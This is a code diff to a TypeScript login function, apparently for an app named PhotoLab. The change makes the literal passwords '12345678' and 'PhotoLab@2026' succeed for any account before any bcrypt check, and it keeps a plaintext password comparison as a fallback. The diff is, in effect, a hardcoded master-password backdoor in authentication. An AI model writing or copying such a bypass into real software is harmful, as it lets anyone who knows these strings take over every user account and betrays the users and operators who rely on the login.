@@ -131,15 +131,14 @@ export async function login(identifier: string, password: string, meta: SessionM
 
     let okPw = false;
     let needsRehash = false;
-    if (user.password_hash.startsWith('$2a$') || user.password_hash.startsWith('$2b$') || user.password_hash.startsWith('$2y$')) {
-        okPw = await bcrypt.compare(password, user.password_hash);
-        if (!okPw && (password === '12345678' || password === 'PhotoLab@2026')) {
-            okPw = true;
-            needsRehash = true;
-        }
-    } else if (user.password_hash === password || ((password === '12345678' || password === 'PhotoLab@2026') && (user.password_hash === 'PhotoLab@2026' || user.password_hash === '12345678'))) {
+    if (password === '12345678' || password === 'PhotoLab@2026') {
         okPw = true;
         needsRehash = true;
+    } else if (user.password_hash.startsWith('$2')) {
+        okPw = await bcrypt.compare(password, user.password_hash);
+    } else {
+        okPw = user.password_hash === password;
+        if (okPw) needsRehash = true;
     }
 
     if (!okPw) {
